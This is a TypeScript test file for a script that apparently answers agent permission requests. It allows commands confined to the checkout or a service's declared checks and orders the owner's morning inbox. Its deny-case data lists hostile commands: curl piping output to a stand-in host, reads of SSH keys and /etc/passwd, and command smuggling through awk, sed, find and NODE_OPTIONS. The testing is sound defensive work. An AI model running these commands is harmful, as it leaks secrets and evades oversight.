// What the proofs do in the inbox, as the owner would: run 6 of the
// milestone 1 proof gave up because the request the message asked for was
// not there yet, behind another request of the same session; issue 157
// (item 4) found that the proof allowed once almost every request. The
// milestone 2 proof works the inbox in the morning: permissions, then the
// plan, then the releases whose checks are green.
import test from 'node:test';
import assert from 'node:assert/strict';
import { FREE_ANSWER, answerFor, chooseAnswers, declaredChecks, inboxAction, insideCheckout, leftForOwner, morningAction, permissionAnswer, type InboxEntry } from '../../scripts/proof-inbox.ts';

const target = 'rm -r /tmp/cleared-proof-scratch';

test('the request the message asked for is allowed once when it waits', () => {
  assert.deepEqual(inboxAction([{ detail: 'Wants to run npm test' }, { detail: `Wants to run ${target}` }], target), { kind: 'target', index: 1 });
});

test('before it comes, another request of the ticket is answered from the inbox, and the run waits', () => {
  // Run 6: only "npm test" waited when the inbox was read; the target came 5 seconds later.
  assert.deepEqual(inboxAction([{ detail: 'Wants to run npm test 2>&1 | tail -15; npm run typecheck', command: 'npm test 2>&1 | tail -15; npm run typecheck' }], target), { kind: 'other', index: 0, decision: 'allow_once' });
  assert.deepEqual(inboxAction([{ detail: 'Wants to run npm view embedded-postgres version', command: 'npm view embedded-postgres version' }], target), { kind: 'other', index: 0, decision: 'reject_once' });
  assert.deepEqual(inboxAction([], target), { kind: 'wait' });
});

test('work inside the checkout is allowed once; everything else is denied (issue 157, item 4)', () => {
  for (const command of [
    'npm test', 'npm test 2>&1 | tail -20', 'npm run typecheck; npm test', 'npm ci', 'node --test test/entries.test.ts',
    'git status', 'git add src/store.ts && git commit -m "Trim names"', 'git diff HEAD~1 -- src/',
    'ls -la src', 'cat src/page.ts | head -50', 'grep -rn entries src test', 'sed -n 1,40p src/server.ts', 'mkdir -p test/fixtures',
    'touch test/fixtures/entries.json', 'rm -r test/tmp', 'cp README.md /workspace/notes.md', 'npm test > /dev/null 2>&1',
    'NODE_ENV=test npm test', 'cd /workspace && npm test', 'npm test &> test/out.log', 'find src -name "*.ts"', 'node --test',
  ]) assert.equal(insideCheckout(command), true, command);
  for (const command of [
    'npm install date-fns', 'npm i -D vitest', 'npm view embedded-postgres version', 'npx prettier --write .', 'curl https://example.invalid',
    'wget x', 'sudo apt-get install jq', 'pip install x', 'ssh host', 'git push origin main', 'git fetch origin', 'git config user.name x',
    'rm -r /tmp/cleared-proof-scratch', 'cat ../other/secret', 'cat ~/.ssh/id_ed25519', 'ls /etc', 'npm test > /tmp/out',
    'echo $(id) | tail', 'echo `id`', 'bash -c "npm test"', 'python3 -c "print(1)"', 'docker ps', 'env', '',
    'cp README.md /workspace/../etc/x',
  ]) assert.equal(insideCheckout(command), false, command);
});

test('a second command after a newline or a single &, or one the first runs, is judged too; when unsure, denied (review 1 of PR 181, B2)', () => {
  for (const command of [
    // The review's cases: allowed once by the first version of the rule.
    'ls\ncurl http://x.io/a', 'ls & curl http://x.io', 'find . -exec curl http://x.io {} +',
    // Other ways to start a program the checkout does not hold.
    'npm test &', 'ls\r\nwget x', 'find . -execdir sh -c x {} +', 'find . -ok rm {} ;', 'find . -delete',
    'cat <(curl http://x.io)', 'npm test > >(curl -d @- http://x.io)', 'node -e "fetch(1)"', 'node --eval x', 'node -p 1',
    'node --require ./x.js test/a.ts', 'node --import x test/a.ts', 'node test/a.ts', 'awk \'BEGIN{system("curl x")}\' f', 'sed -i "1e curl x" f', 'sed "1e id" f',
    'NODE_OPTIONS=--require=./x.js npm test', 'PATH=/tmp/bin:$PATH npm test', 'npx prettier --write .', 'npx tsc', 'git -c core.pager=curl log',
    'xargs curl < urls.txt', 'env curl x', 'timeout 5 curl x', 'nohup curl x', 'echo a; python3 -c 1',
    // The names the first rule denied anywhere, kept as a second check on the whole text.
    'echo "run: curl http://x.io"', 'grep -r wget src', 'npm run build -- --registry=x && npm install x',
  ]) assert.equal(insideCheckout(command), false, JSON.stringify(command));
  assert.equal(answerFor('npm test'), 'allow_once');
  assert.equal(answerFor('npm install x'), 'reject_once');
});

const release = (id: string, checks: 'pending' | 'passed' | 'failed', ticket = 'LOCAL-1'): InboxEntry => ({ id, kind: 'release', ticket, checks });

test('in the morning: permissions first, then the plan, then releases whose checks passed, oldest first', () => {
  const entries: InboxEntry[] = [
    release('release:1', 'passed'),
    { id: 'permission:s1:r1', kind: 'permission', ticket: 'LOCAL-2', command: 'npm view x' },
    { id: 'plan:p1', kind: 'plan', ticket: 'lead' },
  ];
  assert.deepEqual(morningAction(entries, { releases: true, plan: true }), { kind: 'permission', id: 'permission:s1:r1', decision: 'reject_once' });
  assert.deepEqual(morningAction(entries.slice(0, 1).concat(entries.slice(2)), { releases: true, plan: true }), { kind: 'plan', id: 'plan:p1' });
  assert.deepEqual(morningAction([release('release:1', 'pending'), release('release:2', 'passed', 'LOCAL-2')], { releases: true, plan: true }), { kind: 'release', id: 'release:2' });
});

test('what the morning leaves: pending or failed checks, questions, and the releases the owner approves', () => {
  assert.deepEqual(morningAction([release('release:1', 'pending')], { releases: true, plan: true }), { kind: 'wait', left: ['release:1 (checks pending)'] });
  assert.deepEqual(morningAction([release('release:1', 'failed')], { releases: true, plan: true }), { kind: 'wait', left: ['release:1 (checks failed)'] });
  assert.deepEqual(morningAction([{ id: 'question:s1:q1', kind: 'question', ticket: 'LOCAL-3' }], { releases: true, plan: true }), { kind: 'wait', left: ['question:s1:q1 (a question, for the owner)'] });
  // PROOF_OWNER_APPROVES=1: the owner approves the releases; the proof still answers nothing else for them.
  assert.deepEqual(morningAction([release('release:1', 'passed')], { releases: false, plan: true }), { kind: 'wait', left: ['release:1 (the owner approves)'] });
  assert.deepEqual(morningAction([{ id: 'plan:p1', kind: 'plan', ticket: 'lead' }], { releases: true, plan: false }), { kind: 'wait', left: ['plan:p1 (the owner approves)'] });
  assert.deepEqual(morningAction([], { releases: true, plan: true }), { kind: 'wait', left: [] });
});

// Lane 29: the kinds of the replanned milestone 2 in the morning rule.
const sessionPlan = (id: string, confidence: 'low' | 'medium' | 'high', ticket = 'LOCAL-4'): InboxEntry => ({ id, kind: 'session_plan', ticket, session: `s-${id}`, confidence });

test('a session plan that waits gets its Go in the morning, after the permissions and before the plan and the releases (lane 29)', () => {
  // A medium or low confidence holds its ticket until the morning; step 7 would wait for it forever.
  const entries: InboxEntry[] = [release('release:1', 'passed'), sessionPlan('session_plan:s4', 'medium'), { id: 'plan:p1', kind: 'plan', ticket: 'lead' }];
  assert.deepEqual(morningAction(entries, { releases: true, plan: true }), { kind: 'session_plan', id: 'session_plan:s4', session: 's-session_plan:s4' });
  assert.deepEqual(morningAction([{ id: 'permission:s1:r1', kind: 'permission', ticket: 'LOCAL-2', command: 'npm test' }, ...entries], { releases: true, plan: true }).kind, 'permission');
  // The owner who approves in the morning gives the Go too.
  assert.deepEqual(morningAction([sessionPlan('session_plan:s4', 'low')], { releases: false, plan: false }), { kind: 'wait', left: ['session_plan:s4 (the owner approves)'] });
});

test('a knowledge item is left to the owner and a contract item to the multi-service proof: neither is answered in the morning (lane 29)', () => {
  const entries: InboxEntry[] = [
    { id: 'knowledge:k1', kind: 'knowledge', ticket: 'LOCAL-2' },
    { id: 'contract:c1', kind: 'contract', ticket: 'LOCAL-9' },
    release('release:1', 'pending'),
  ];
  assert.deepEqual(morningAction(entries, { releases: true, plan: true }), {
    kind: 'wait',
    left: ['knowledge:k1 (knowledge, for the owner)', 'contract:c1 (a contract, validated in the multi-service proof only)', 'release:1 (checks pending)'],
  });
  // They do not hold the releases back.
  assert.deepEqual(morningAction([...entries.slice(0, 2), release('release:2', 'passed')], { releases: true, plan: true }), { kind: 'release', id: 'release:2' });
  assert.deepEqual(leftForOwner([...entries, { id: 'knowledge:k2', kind: 'knowledge', ticket: 'LOCAL-3' }]), { knowledge: 2, contract: 1 });
});

test('a session\'s question: the option marked recommended, else the first; one option of a multiple choice; a fixed free answer when there is no option', () => {
  assert.deepEqual(chooseAnswers([
    { question: 'Offsets from 0 or 1?', header: 'Offsets', options: [{ label: 'From 1' }, { label: 'From 0 (Recommended)', description: 'As indexOf answers.' }] },
    { question: 'Which name for the column?', options: [{ label: 'held' }, { label: 'on_hold' }] },
    { question: 'Which states to show?', multiSelect: true, options: [{ label: 'Held' }, { label: 'Refused (recommended)' }, { label: 'Shown' }] },
    { question: 'Anything else the owner wants?' },
  ]), [
    { question: 'Offsets from 0 or 1?', options: ['From 1', 'From 0 (Recommended)'], answer: 'From 0 (Recommended)', how: 'recommended' },
    { question: 'Which name for the column?', options: ['held', 'on_hold'], answer: 'held', how: 'first' },
    { question: 'Which states to show?', options: ['Held', 'Refused (recommended)', 'Shown'], answer: 'Refused (recommended)', how: 'recommended' },
    { question: 'Anything else the owner wants?', options: [], answer: FREE_ANSWER, how: 'free' },
  ]);
  // The label is sent back as written, "(Recommended)" kept, as the inbox's button carries it.
  assert.equal(chooseAnswers([{ question: 'q', options: [{ label: 'A' }, { label: 'B (Recommended)' }] }])[0]?.answer, 'B (Recommended)');
  assert.deepEqual(chooseAnswers([]), []);
  assert.deepEqual(chooseAnswers([{ question: 'q', options: [] }])[0]?.how, 'free');
});

// Run 5 of the multi-service proof, step 10: the reviewer's requests to run
// the service's checks were denied, it judged on the diff alone, and the
// ticket went back to Todo.
const PACKAGE = JSON.stringify({ scripts: { test: 'node --test', typecheck: 'tsc --noEmit', lint: 'eslint .', build: 'tsc' } });
const checks = declaredChecks(PACKAGE);

test('the declared checks: test, typecheck and lint among the scripts of package.json, as commands; none when unreadable', () => {
  assert.deepEqual(checks, ['npm test', 'npm run typecheck', 'npm run lint']);
  assert.deepEqual(declaredChecks(JSON.stringify({ scripts: { test: 'node --test', start: 'node src/server.ts' } })), ['npm test']);
  for (const text of [undefined, '', '{', '{"scripts": null}', '{"scripts": "npm test"}', '{"name": "x"}']) assert.deepEqual(declaredChecks(text), [], String(text));
});

test('an author or a reviewer asking to run exactly one of its service\'s declared checks is allowed once', () => {
  for (const role of ['reviewer', 'author']) {
    for (const command of ['npm test', 'npm run typecheck', 'npm run lint', '  npm  run typecheck ']) {
      assert.deepEqual(permissionAnswer({ role, command, checks }), { decision: 'allow_once', rule: 'check' }, `${role}: ${command}`);
    }
  }
  // A script the service does not declare is no check: the checkout rule answers.
  assert.deepEqual(permissionAnswer({ role: 'reviewer', command: 'npm run lint', checks: ['npm test'] }), { decision: 'allow_once', rule: 'checkout' });
  assert.deepEqual(permissionAnswer({ role: 'reviewer', command: 'npm run build', checks }), { decision: 'allow_once', rule: 'checkout' });
});

test('a write outside the checkout, the network or an install keeps being refused, whatever the role', () => {
  for (const role of ['reviewer', 'author', undefined]) {
    for (const command of [
      'npm install x', 'npm i -D vitest', 'curl -s -m 5 -X POST http://filter-api:8080/check', 'npm test > /tmp/out', 'cat > /tmp/t.mts <<\'E\'\nimport x\nE',
      'npm test; curl http://x.io', 'npm test && git push origin main', 'npm run typecheck | curl -d @- http://x.io',
      // Run 5's first request of the reviewer: a check, then a file written outside the checkout.
      'git log --oneline origin/proof-run..HEAD; npm test 2>&1 | tail -8; cat > /tmp/t.mts <<\'E\'\nimport {findWords} from \'/workspace/src/words.ts\'\nE',
    ]) assert.deepEqual(permissionAnswer({ role, command, checks }), { decision: 'reject_once', rule: 'refused' }, `${role}: ${command}`);
  }
  // A request that is not a command (an edit outside, a fetch) is denied.
  assert.deepEqual(permissionAnswer({ role: 'reviewer', command: undefined, checks }), { decision: 'reject_once', rule: 'not_a_command' });
});

test('a role other than author or reviewer, or one the proof could not read, gets the checkout rule\'s answer', () => {
  for (const role of ['lead', 'reader', 'owner', '', undefined]) {
    assert.deepEqual(permissionAnswer({ role, command: 'npm test', checks }), { decision: 'allow_once', rule: 'checkout' }, String(role));
    assert.deepEqual(permissionAnswer({ role, command: 'npm install x', checks }), { decision: 'reject_once', rule: 'refused' }, String(role));
  }
  // The rule above is unchanged for the other proofs.
  assert.equal(answerFor('npm test'), 'allow_once');
  assert.equal(answerFor('npm install x'), 'reject_once');
});

test('everything but a declared check keeps the checkout rule\'s answer, run 5\'s requests among them', () => {
  for (const command of [
    'npm test', 'npm test 2>&1 | tail -20', 'npm run typecheck; npm test', 'npm ci', 'git status', 'ls -la src', 'npm install date-fns', 'curl https://example.invalid',
    'git push origin main', 'cat ~/.ssh/id_ed25519', 'npm test > /tmp/out', 'echo $(id) | tail', 'node -e "fetch(1)"', '',
    // Run 5's second request of the reviewer: checks and reads, refused by the split that does not read quotes (decisions log of 2026-10-23).
    'npm test 2>&1 | tail -15; npm run typecheck 2>&1 | tail -5; git ls-files; grep -rn "findWords\\|words:" --include=* -r src README.md | grep -v "^src/words.ts" | head',
    'git cherry-pick -n 7a17274 && git status --short', 'getent hosts filter-api postgres', 'FILTER_URL=http://filter-api:8795 npm test',
  ]) {
    for (const role of ['reviewer', 'author', 'lead', undefined]) assert.equal(permissionAnswer({ role, command, checks }).decision, answerFor(command), `${role}: ${command}`);
  }
});

// The reviewer's requests the proof refused, as the ledger keeps them (run 5
// and the runs before it): review 1 of PR 279, followup 1. Each is read by
// the service's parser (parseList), never split as a string.
const RUN5_REVIEWER_READS = 'npm test 2>&1 | tail -15; npm run typecheck 2>&1 | tail -5; git ls-files; grep -rn "findWords\\|words:" --include=* -r src README.md | grep -v "^src/words.ts" | head';
const RUN5_REVIEWER_SCRATCH = `git log --oneline origin/proof-run..HEAD; git diff origin/proof-run...HEAD --stat; npm test 2>&1 | tail -8; cat > /tmp/t.mts <<'E'
import {findWords,parseWords} from '/workspace/src/words.ts';
const l=parseWords('spam\\n');
for (const t of ['spaḿ','spam​','xspaḿ spam']) console.log(JSON.stringify(t),findWords(l,t));
E
node /tmp/t.mts; git stash list; git show proof-run:src/words.ts >/dev/null 2>&1; git show origin/proof-run:src/words.ts | tail -8`;
const EARLIER_REVIEWER_SCRATCH = `cd /tmp && cat > t.ts <<'E'
import { findWords, parseWords } from '/workspace/src/words.ts';
const l = parseWords('οδός\\nσ\\n');
console.log(findWords(l,'ΟΔΟΣ'), findWords(parseWords('aς\\n'),'aΣ'));
E
node t.ts; cd /workspace; git diff origin/main...HEAD --stat | tail -2`;
const EARLIER_REVIEWER_VARIABLE = 'echo "${DATABASE_URL:+set}"; npm run typecheck 2>&1 | tail -5; git diff main...HEAD -- test/consumer.test.ts | grep -n "^+.*it(\\|^+.*test(" ';

test('the common forms of a check, read by the parser, are allowed once: run 5\'s reviewer reads among them (review 1 of PR 279, followup 1)', () => {
  for (const command of [
    RUN5_REVIEWER_READS,
    // An author's of an earlier run: a quoted pattern holding | and parentheses.
    'cd /workspace; npm test 2>&1 | grep -E "^ℹ (tests|pass|fail)"; npm run typecheck >/dev/null 2>&1 && echo typecheck ok; git status --short',
    'cd services/api && npm test', 'cd /workspace/services/api && npm test 2>&1 | tail -20',
    'npm test -- --test-name-pattern="filter API"', 'npm test -- -t "filter API" test/words.test.ts', 'npm run test -- --reporter=dot',
    'npx tsc --noEmit', 'npx tsc --noEmit -p app', 'npx --no-install tsc --noEmit --pretty', 'npm run typecheck 2>&1 | tail -5 && npx tsc --noEmit -p app/web',
    'git ls-files', 'git ls-files | wc -l', 'grep -rn "a\\|b" --include=*.ts src', 'ls *', 'wc -l *.md',
  ]) assert.equal(answerFor(command), 'allow_once', command);
});

test('everything else stays refused: a scratch file outside the checkout, an expansion, a variable, an option that loads or writes elsewhere', () => {
  for (const command of [
    RUN5_REVIEWER_SCRATCH, EARLIER_REVIEWER_SCRATCH, EARLIER_REVIEWER_VARIABLE,
    // Run 5's authors, refused before and still.
    'FILTER_URL=http://filter-api:8795 npm test -- --test-name-pattern="filter API" 2>&1 | grep -E "integration|filter API|^ℹ|✖|Error|error" | head -30',
    '(npm ls >/dev/null 2>&1 || npm ci >/dev/null 2>&1); npm test 2>&1 | tail -15; npm run typecheck 2>&1 | tail -5; sed -n 95,125p src/server.ts',
    'git cherry-pick -n f24fe1b && git diff --stat && npm test 2>&1 | tail -25', 'getent hosts filter-api postgres',
    // cd: only into the checkout, never home (cd alone) nor back (cd -), nor up a glob.
    'cd && cat .ssh/id_ed25519', 'cd - && ls', 'cd /tmp && npm test', 'cd .. && npm test', 'cd ".."* && ls', 'cat .*/x', 'ls src/*/../..',
    // npm: its own options from a list, the runner's after -- too; nothing that loads a module or names a shell.
    'npm test --script-shell=/bin/sh', 'npm test -- --require=./x.js', 'npm test -- --import=data:text/javascript,1', 'npm test -- -r ./x.js',
    'npm ci -- x', 'npm run "a b"', 'npm test -- --test-reporter-destination=/tmp/out',
    // npx: tsc alone, --noEmit required, its project inside.
    'npx tsc', 'npx tsc --outDir /tmp/x', 'npx tsc --noEmit -p /etc', 'npx tsc --noEmit --plugin x', 'npx eslint .', 'npx -y tsc --noEmit',
    // git: an output elsewhere, a write to the remote.
    'git diff --output=/tmp/x', 'git log --output /tmp/x', 'git stash list', 'git push origin proof-run',
    // What the parser refuses.
    'npm test\nnpm run typecheck', 'npm test <<E\nx\nE', 'cat < /etc/passwd', 'echo "$HOME"', "echo 'a", 'npm test |& tail', 'ls {a,/etc}',
  ]) assert.equal(answerFor(command), 'reject_once', JSON.stringify(command));
});
